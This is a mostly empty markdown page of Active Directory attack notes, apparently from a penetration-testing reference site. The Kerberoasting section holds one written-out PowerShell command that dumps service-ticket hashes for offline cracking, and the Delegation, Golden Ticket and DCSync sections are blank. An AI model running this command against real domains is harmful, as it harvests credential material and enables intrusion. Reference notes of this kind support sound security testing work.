---
layout: default
title: AD Attacks
parent: Attacks
nav_order: 2
---

# AD Attacks
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Kerberoasting
Invoke-Kerberoast.ps1
```
Invoke-Kerberoast -OutputFormat hashcat 2>&1 | tee -filepath C:\Users\user\Downloads\kerb.txt
```


## Delegation Issues



## Golden Ticket and DCSync